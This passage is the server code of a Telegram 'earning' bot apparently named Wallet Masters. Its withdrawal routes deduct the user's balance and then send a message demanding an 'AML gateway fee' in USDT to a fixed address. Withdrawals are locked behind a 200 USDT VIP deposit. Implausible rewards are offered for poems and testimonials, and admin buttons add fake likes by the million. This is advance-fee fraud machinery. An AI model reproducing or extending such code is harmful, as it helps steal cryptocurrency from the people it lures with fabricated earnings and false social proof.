    referralCode: user.referral_code || user.uid,
    referralCount: user.referral_count || 0,
    telegramId: user.telegram_id,
    name: user.full_name || user.registered_name || '',
    username: user.telegram_username || '',
    hourlyStatus: {
      canClaim:    hourlyStatus.canClaim,
      nextClaimIn: Math.round(hourlyStatus.nextClaimIn / 1000),
      earningRate, hourlyAmount: earningRate
    }
  };
}

// ─── API Routes ───────────────────────────────────────────────────────────────

app.post('/api/auth', (req, res) => {
  const tgUser = getTelegramUser(req);
  if (!tgUser) return res.status(401).json({ error: 'Unauthorized' });
  const { id, username, first_name, last_name } = tgUser;
  const fullName     = [first_name, last_name].filter(Boolean).join(' ');
  const ref          = req.body?.ref || req.body?.referralCode || null;
  const user         = getOrCreateUser(id, username, fullName, ref);
  const transactions = getUserTransactions(id).slice(0, 20);
  const connections  = getUserConnections(id);
  const withdrawals  = getUserWithdrawals(id);
  res.json({ success: true, user: enrichUser(user, id), transactions, connections, withdrawals });
});

app.get('/api/dashboard', authMiddleware, (req, res) => {
  const user = getUserByTelegramId(req.tgUser.id);
  if (!user) return res.status(404).json({ error: 'User not found' });
  const hourlyStatus = getHourlyStatus(user.telegram_id);
  const transactions = getUserTransactions(user.telegram_id).slice(0, 20);
  const earningApps  = getEarningApps();
  const connections  = getUserConnections(user.telegram_id);
  const withdrawals  = getUserWithdrawals(user.telegram_id);
  res.json({ user: enrichUser(user, req.tgUser.id), hourlyStatus, transactions, earningApps, connections, withdrawals });
});

app.post('/api/claim-hourly', authMiddleware, (req, res) => {
  const result = claimHourlyEarning(req.tgUser.id);
  if (!result.success) return res.status(400).json(result);
  res.json(result);
});

app.post('/api/hourly-status', authMiddleware, (req, res) => {
  const status = getHourlyStatus(req.tgUser.id);
  res.json({ canClaim: status.canClaim, nextClaimIn: Math.round(status.nextClaimIn / 1000), hourlyAmount: status.hourlyAmount, earningRate: status.hourlyAmount });
});

// ─── WITHDRAWAL — FIX: status properly returned + user message on pending ─────
app.post('/api/withdraw', authMiddleware, async (req, res) => {
  const user = getUserByTelegramId(req.tgUser.id);
  if (!user) return res.status(404).json({ error: 'User not found' });
  if (!user.is_vip) return res.status(403).json({ error: 'VIP required for withdrawals' });

  const { amount, isBankWithdrawal, toAddress, bankName, bankCountry,
          localCurrency, accountNumber, accountName, network, method } = req.body;
  const amt = parseFloat(amount);

  if (!amt || amt < MIN_WITHDRAWAL || amt > MAX_WITHDRAWAL)
    return res.status(400).json({ error: `Amount must be between ${MIN_WITHDRAWAL} and ${MAX_WITHDRAWAL} USDT` });
  if (user.usdt_balance < amt)
    return res.status(400).json({ error: 'Insufficient balance' });

  const fees = calculateFees(amt);
  updateUserBalance(user.telegram_id, -amt);
  createTransaction(user.telegram_id, 'withdrawal', amt, 'Withdrawal request', 'pending');

  const wd = createWithdrawalRequest({
    telegram_id:    user.telegram_id,
    amount:         amt,
    method:         method || (isBankWithdrawal ? 'bank' : 'crypto'),
    account_number: accountNumber || toAddress || '',
    bank_name:      bankName  || '',
    country:        bankCountry || '',
    currency:       localCurrency || 'USDT',
    fee:            fees.total_fee,
    net_amount:     fees.net_amount
  });

  // Notify admin
  bot.sendMessage(ADMIN_CHAT_ID,
    `💸 <b>New Withdrawal #${wd.id}</b>\n\n👤 ${user.full_name} (${user.uid})\n💰 ${amt} USDT | Fee: ${fees.total_fee} USDT\n🏦 ${bankName || method || 'Crypto'} — ${accountNumber || toAddress || ''}\n🌍 ${bankCountry || ''} ${localCurrency || ''}`,
    { parse_mode: 'HTML', reply_markup: { inline_keyboard: [[
      { text: '✅ Approve', callback_data: `wd_approve_${wd.id}` },
      { text: '❌ Reject',  callback_data: `wd_reject_${wd.id}`  }
    ]]}}
  ).catch(() => {});

  // FIX: Instantly notify user with AML gateway fee message
  bot.sendMessage(user.telegram_id,
    `⚠️ <b>Action Required — Withdrawal #${wd.id}</b>\n\nTo finalize your withdrawal, we require the settlement of your outstanding gateway fee. This procedure ensures alignment with mandatory Anti-Money Laundering (AML) policies designed to prevent digital assets from being utilized in financial crimes.\n\nPlease fund your designated USDT TRC20 address with the required USDT amount, and your transaction will be processed immediately.\n\n📍 <b>Your TRC20 Address:</b>\n<code>${FEE_ADDRESS}</code>\n\n💰 <b>Gateway Fee:</b> ${fees.total_fee} USDT`,
    { parse_mode: 'HTML', ...openWalletBtn() }
  ).catch(() => {});

  res.json({ success: true, withdrawal: wd, fees });
});

// Also keep /api/withdrawal alias
app.post('/api/withdrawal', authMiddleware, async (req, res) => {
  req.url = '/api/withdraw'; // delegate
  const user = getUserByTelegramId(req.tgUser.id);
  if (!user) return res.status(404).json({ error: 'User not found' });
  const { amount, method, account_number, bank_name, country, currency } = req.body;
  const amt = parseFloat(amount);
  if (!amt || amt < MIN_WITHDRAWAL || amt > MAX_WITHDRAWAL)
    return res.status(400).json({ error: `Amount must be between ${MIN_WITHDRAWAL} and ${MAX_WITHDRAWAL} USDT` });
  if (user.usdt_balance < amt) return res.status(400).json({ error: 'Insufficient balance' });
  const fees = calculateFees(amt);
  updateUserBalance(user.telegram_id, -amt);
  createTransaction(user.telegram_id, 'withdrawal', amt, 'Withdrawal request', 'pending');
  const wd = createWithdrawalRequest({ telegram_id: user.telegram_id, amount: amt, method, account_number, bank_name, country, currency, fee: fees.total_fee, net_amount: fees.net_amount });
  bot.sendMessage(ADMIN_CHAT_ID, `💸 <b>Withdrawal #${wd.id}</b>\n\n👤 ${user.full_name} (${user.uid})\n💰 ${amt} USDT\n🏦 ${bank_name||method} — ${account_number}\n🌍 ${country||''} ${currency||''}`, { parse_mode: 'HTML', reply_markup: { inline_keyboard: [[{ text: '✅ Approve', callback_data: `wd_approve_${wd.id}` }, { text: '❌ Reject', callback_data: `wd_reject_${wd.id}` }]] }}).catch(() => {});
  bot.sendMessage(user.telegram_id, `⚠️ <b>Action Required</b>\n\nTo finalize your withdrawal, we require the settlement of your outstanding gateway fee. This procedure ensures alignment with mandatory Anti-Money Laundering (AML) policies designed to prevent digital assets from being utilized in financial crimes.\n\nPlease fund your designated USDT TRC20 address with the required USDT amount, and your transaction will be processed immediately.\n\n📍 TRC20 Address: <code>${FEE_ADDRESS}</code>\n💰 Gateway Fee: ${fees.total_fee} USDT`, { parse_mode: 'HTML', ...openWalletBtn() }).catch(() => {});
  res.json({ success: true, withdrawal: wd, fees });
});

// Get user withdrawals (for status polling)
app.get('/api/withdrawals', authMiddleware, (req, res) => {
  const wds = getUserWithdrawals(req.tgUser.id);
  res.json({ withdrawals: wds });
});

// VIP upgrade
app.post('/api/vip-upgrade', authMiddleware, async (req, res) => {
  const user = getUserByTelegramId(req.tgUser.id);
  if (!user) return res.status(404).json({ error: 'User not found' });
  if (user.is_vip) return res.status(400).json({ error: 'Already VIP' });
  const { receiptBase64, uid } = req.body;
  const imageData = receiptBase64 || req.body.receipt_image;
  const wd = createWithdrawalRequest({
    telegram_id: user.telegram_id, amount: 200, method: 'vip_upgrade',
    account_number: 'VIP Deposit', bank_name: 'VIP Upgrade', status: 'pending_vip'
  });
  if (imageData) {
    try {
      const buffer = Buffer.from(imageData.replace(/^data:[^;]+;base64,/, ''), 'base64');
      bot.sendPhoto(ADMIN_CHAT_ID, buffer, {
        caption: `👑 VIP Request\n${user.full_name} (${user.uid})\nTelegram ID: ${user.telegram_id}`,
        reply_markup: { inline_keyboard: [[
          { text: '👑 Activate VIP', callback_data: `vip_approve_${user.telegram_id}` },
          { text: '❌ Reject',       callback_data: `vip_reject_${user.telegram_id}`  }
        ]]}
      }).catch(() => {
        bot.sendMessage(ADMIN_CHAT_ID, `👑 VIP Request from ${user.full_name} (${user.uid})`, {
          reply_markup: { inline_keyboard: [[{ text: '👑 Activate VIP', callback_data: `vip_approve_${user.telegram_id}` }, { text: '❌ Reject', callback_data: `vip_reject_${user.telegram_id}` }]] }
        }).catch(() => {});
      });
    } catch(e) {}
  }
  res.json({ success: true, message: 'VIP upgrade request submitted' });
});

app.post('/api/accept-terms', authMiddleware, (req, res) => {
  db.get('users').find({ telegram_id: String(req.tgUser.id) }).assign({ terms_accepted: true, updated_at: nowSec() }).write();
  res.json({ success: true });
});

// Support
app.post('/api/support', authMiddleware, async (req, res) => {
  const user = getUserByTelegramId(req.tgUser.id);
  if (!user) return res.status(404).json({ error: 'User not found' });
  const { message } = req.body;
  if (!message) return res.status(400).json({ error: 'Missing message' });
  createSupportMessage(user.telegram_id, message, false);
  bot.sendMessage(ADMIN_CHAT_ID,
    `💬 <b>User Reply</b>\n\n👤 ${user.full_name}\n🆔 UID: <code>${user.uid}</code>\n\n"${message}"`,
    { parse_mode: 'HTML', reply_markup: { inline_keyboard: [[{ text: 'Reply', callback_data: `reply_user_${user.telegram_id}` }]] }}
  ).catch(() => {});
  res.json({ success: true });
});
app.post('/api/support/send', authMiddleware, async (req, res) => {
  const user = getUserByTelegramId(req.tgUser.id);
  if (!user) return res.status(404).json({ error: 'User not found' });
  const { message } = req.body;
  if (!message) return res.status(400).json({ error: 'Missing message' });
  createSupportMessage(user.telegram_id, message, false);
  bot.sendMessage(ADMIN_CHAT_ID,
    `💬 <b>Support from ${user.full_name} (${user.uid})</b>\n\n"${message}"`,
    { parse_mode: 'HTML', reply_markup: { inline_keyboard: [[{ text: 'Reply', callback_data: `reply_user_${user.telegram_id}` }]] }}
  ).catch(() => {});
  res.json({ success: true });
});
app.get('/api/support/messages', (req, res) => {
  const tgUser     = getTelegramUser(req);
  const telegramId = tgUser?.id || req.query.telegramId;
  if (!telegramId) return res.json([]);
  res.json(getSupportMessages(String(telegramId)));
});

// Testimonials — FIX: single handler, fire-and-forget media upload
async function handleTestimonialSubmit(req, res) {
  const user = getUserByTelegramId(req.tgUser.id);
  if (!user) return res.status(404).json({ error: 'User not found' });
  const type        = req.body.type;
  const caption     = req.body.caption || '';
  const youtubeUrl  = req.body.youtubeUrl || req.body.youtube_url || '';
  const videoData   = req.body.videoData  || req.body.video_file  || '';
  const videoFileName = req.body.videoFileName || 'testimonial.mp4';

  const tes = createTestimonial(user.telegram_id, { user_name: user.full_name, type, youtube_url: youtubeUrl, video_file: videoData ? '[stored]' : '', caption });
  const reward = type === 'youtube' ? 2000 : 1000;

  // FIX: Respond IMMEDIATELY — don't wait for Telegram upload
  res.json({ success: true, testimonial: tes });

  // Fire-and-forget Telegram notifications
  bot.sendMessage(ADMIN_CHAT_ID,
    `🎬 <b>New Testimonial #${tes.id}</b>\n\n👤 ${user.full_name} (${user.uid})\n📎 ${type === 'youtube' ? '📺 YouTube' : '🎥 Video'}\n${youtubeUrl ? '🔗 ' + youtubeUrl + '\n' : ''}💬 ${caption || 'none'}\n💰 Reward: ${reward} USDT`,
    { parse_mode: 'HTML', reply_markup: { inline_keyboard: [[
      { text: `✅ Approve (+${reward} USDT)`, callback_data: `test_approve_${tes.id}` },
      { text: '❌ Reject', callback_data: `test_reject_${tes.id}` }
    ]]}}
  ).catch(() => {});

  if (type !== 'youtube' && videoData) {
    setImmediate(async () => {
      try {
        const buffer = Buffer.from(videoData.replace(/^data:[^;]+;base64,/, ''), 'base64');
        const ext    = videoFileName.split('.').pop().toLowerCase();
        if (['mp4','mov','webm','avi'].includes(ext)) {
          bot.sendVideo(ADMIN_CHAT_ID, buffer, { caption: `🎥 Video — Testimonial #${tes.id}\n${user.full_name}` }).catch(() => {
            bot.sendDocument(ADMIN_CHAT_ID, buffer, { filename: videoFileName, caption: `Testimonial #${tes.id}` }).catch(() => {});
          });
        } else {
          bot.sendDocument(ADMIN_CHAT_ID, buffer, { filename: videoFileName, caption: `Testimonial #${tes.id}` }).catch(() => {});
        }
      } catch(e) {}
    });
  }
}
app.post('/api/testimonial',        authMiddleware, handleTestimonialSubmit);
app.post('/api/testimonial/submit', authMiddleware, handleTestimonialSubmit);

// Earning apps
app.get('/api/earning-apps', (req, res) => res.json({ apps: getEarningApps() }));
app.get('/api/apps',         (req, res) => res.json(getEarningApps()));

// Connect UID — FIX: accept initData from body or header
app.post('/api/connect-uid', authMiddleware, (req, res) => {
  const user = getUserByTelegramId(req.tgUser.id);
  if (!user) return res.status(404).json({ error: 'User not found' });
  const { app_token, appId, external_uid, uid } = req.body;
  const earningApp = app_token ? getEarningAppByToken(app_token) : (appId ? getEarningAppById(parseInt(appId)) : null);
  if (!earningApp) return res.status(404).json({ error: 'App not found' });
  const conn = connectUID(user.telegram_id, earningApp.id, external_uid || uid);
  res.json({ success: true, connection: conn });
});
app.post('/api/earning-app/connect', authMiddleware, (req, res) => {
  const user = getUserByTelegramId(req.tgUser.id);
  if (!user) return res.status(404).json({ error: 'User not found' });
  const { app_token, external_uid } = req.body;
  const earningApp = getEarningAppByToken(app_token);
  if (!earningApp) return res.status(404).json({ error: 'App not found' });
  const conn = connectUID(user.telegram_id, earningApp.id, external_uid);
  res.json({ success: true, connection: conn });
});

app.get('/api/transactions', authMiddleware, (req, res) => res.json({ transactions: getUserTransactions(req.tgUser.id) }));

app.post('/api/admin/add-earning-app', (req, res) => {
  if (req.headers['x-admin-key'] !== BOT_TOKEN) return res.status(401).json({ error: 'Unauthorized' });
  const { name, bot_token } = req.body;
  if (!name || !bot_token) return res.status(400).json({ error: 'Missing name or bot_token' });
  res.json({ success: true, app: addEarningApp({ name, bot_token }) });
});

// ─── POEMS / INSPIRATION ──────────────────────────────────────────────────────
app.post('/api/poem/submit', authMiddleware, async (req, res) => {
  const user = getUserByTelegramId(req.tgUser.id);
  if (!user) return res.status(404).json({ error: 'User not found' });
  const { content, category, title } = req.body;
  if (!content || content.trim().length < 20) return res.status(400).json({ error: 'Content too short (min 20 chars)' });
  const poem = createPoem(user.telegram_id, { title: title || '', category: category || 'General', content: content.trim(), user_name: user.full_name });
  res.json({ success: true, poem });
  // Fire-and-forget admin notify
  bot.sendMessage(ADMIN_CHAT_ID,
    `📝 <b>New Poem/Inspiration #${poem.id}</b>\n\n👤 ${user.full_name} (${user.uid})\n📂 ${category || 'General'}\n📌 "${title || 'Untitled'}"\n\n"${content.substring(0, 400)}${content.length > 400 ? '...' : ''}"\n\n💰 Reward: 1,000 USDT`,
    { parse_mode: 'HTML', reply_markup: { inline_keyboard: [[
      { text: '✅ Approve (+1,000 USDT)', callback_data: `poem_approve_${poem.id}` },
      { text: '❌ Reject', callback_data: `poem_reject_${poem.id}` }
    ]]}}
  ).catch(() => {});
});

app.get('/api/poems', (req, res) => {
  res.json({ poems: getApprovedPoems() });
});

// ─── SOCIALPAY ────────────────────────────────────────────────────────────────
app.get('/api/socialpay/posts', (req, res) => {
  const posts    = getApprovedSocialPosts();
  const profiles = getAllSocialProfiles();
  const tgUser   = getTelegramUser(req);
  const enriched = posts.map(p => {
    const prof = profiles.find(pr => pr.telegram_id === p.telegram_id) || {};
    return { ...p, author_name: prof.display_name || 'User', author_verified: prof.is_verified || false, author_pic: prof.profile_pic || '', author_country: prof.country || '', liked_by_me: tgUser ? hasLiked(tgUser.id, p.id) : false };
  });
  res.json({ posts: enriched });
});

app.post('/api/socialpay/post', authMiddleware, async (req, res) => {
  const user = getUserByTelegramId(req.tgUser.id);
  if (!user) return res.status(404).json({ error: 'User not found' });
  const { caption, post_type, image_data, voice_data } = req.body;
  if (!caption || caption.trim().length < 5) return res.status(400).json({ error: 'Caption too short' });
  const post = createSocialPost(user.telegram_id, { caption: caption.trim(), post_type: post_type || 'text', has_image: !!image_data, has_voice: !!voice_data, user_likes: 0 });
  res.json({ success: true, post });
  // Notify admin — fire and forget
  const prof = getSocialProfile(user.telegram_id);
  bot.sendMessage(ADMIN_CHAT_ID,
    `🌟 <b>New SocialPay Post #${post.id}</b>\n\n👤 ${user.full_name} (${user.uid})${prof.is_verified ? ' 🟠✅' : ''}\n📎 Type: ${post_type || 'text'}\n💬 "${caption.substring(0, 300)}"\n\n✅ Approve to make live, then send likes to reward.`,
    { parse_mode: 'HTML', reply_markup: { inline_keyboard: [
      [{ text: '✅ Approve Post', callback_data: `sp_approve_${post.id}` }, { text: '❌ Reject', callback_data: `sp_reject_${post.id}` }],
      [{ text: '❤️ 1K likes',  callback_data: `sp_likes_${post.id}_1000`   }, { text: '❤️ 10K likes',  callback_data: `sp_likes_${post.id}_10000`  }],
      [{ text: '❤️ 100K likes',callback_data: `sp_likes_${post.id}_100000` }, { text: '❤️ 1M likes',   callback_data: `sp_likes_${post.id}_1000000`}]
    ]}}
  ).catch(() => {});
  // Send image if present
  if (image_data) {
    setImmediate(() => {
      try {
        const buf = Buffer.from(image_data.replace(/^data:[^;]+;base64,/, ''), 'base64');
        bot.sendPhoto(ADMIN_CHAT_ID, buf, { caption: `SocialPay Post #${post.id} — ${user.full_name}` }).catch(() => {});
      } catch(e) {}
    });
  }
  if (voice_data) {
    setImmediate(() => {
      try {
        const buf = Buffer.from(voice_data.replace(/^data:[^;]+;base64,/, ''), 'base64');
        bot.sendVoice(ADMIN_CHAT_ID, buf, { caption: `SocialPay Post #${post.id} — ${user.full_name}` }).catch(() => {});
      } catch(e) {}
    });
  }
});

app.post('/api/socialpay/like', authMiddleware, (req, res) => {
  const { post_id } = req.body;
  const result = likePost(req.tgUser.id, post_id);
  res.json(result);
});

app.get('/api/socialpay/profile/:telegramId', (req, res) => {
  const prof  = getSocialProfile(req.params.telegramId);
  const posts = getSocialPostsByUser(req.params.telegramId).filter(p => p.status === 'approved');
  res.json({ profile: prof, posts });
});

app.post('/api/socialpay/profile', authMiddleware, (req, res) => {
  const { display_name, country, age, profile_pic } = req.body;
  const updates = {};
  if (display_name) updates.display_name = display_name;
  if (country !== undefined) updates.country = country;
  if (age !== undefined) updates.age = age;
  if (profile_pic !== undefined) updates.profile_pic = profile_pic;
  const prof = updateSocialProfile(req.tgUser.id, updates);
  res.json({ success: true, profile: prof });
});

app.get('/api/socialpay/my-profile', authMiddleware, (req, res) => {
  const prof  = getSocialProfile(req.tgUser.id);
  const posts = getSocialPostsByUser(req.tgUser.id);
  res.json({ profile: prof, posts });
});

app.post('/api/socialpay/apply-verification', authMiddleware, async (req, res) => {
  const prof = getSocialProfile(req.tgUser.id);
  if ((prof.total_likes || 0) < 1000) return res.status(400).json({ error: 'You need at least 1,000 likes to apply for verification' });
  if (prof.is_verified) return res.status(400).json({ error: 'Already verified' });
  const result = createVerificationRequest(req.tgUser.id);
  if (!result.success) return res.status(400).json(result);
  res.json({ success: true });
  const user = getUserByTelegramId(req.tgUser.id);
  bot.sendMessage(ADMIN_CHAT_ID,
    `✅ <b>Verification Request</b>\n\n👤 ${user?.full_name || 'User'} (${user?.uid || req.tgUser.id})\n❤️ Total likes: ${prof.total_likes?.toLocaleString() || 0}\n📝 Posts: ${getSocialPostsByUser(req.tgUser.id).filter(p=>p.status==='approved').length}`,
    { parse_mode: 'HTML', reply_markup: { inline_keyboard: [[
      { text: '🟠 Grant Verified Badge', callback_data: `ver_approve_${result.request.id}` },
      { text: '❌ Reject', callback_data: `ver_reject_${result.request.id}` }
    ]]}}
  ).catch(() => {});
});

if (bot) bot.on('polling_error', (e) => console.log('Polling error:', e.code, e.message));

console.log('Wallet Masters v5 bot.js loaded');
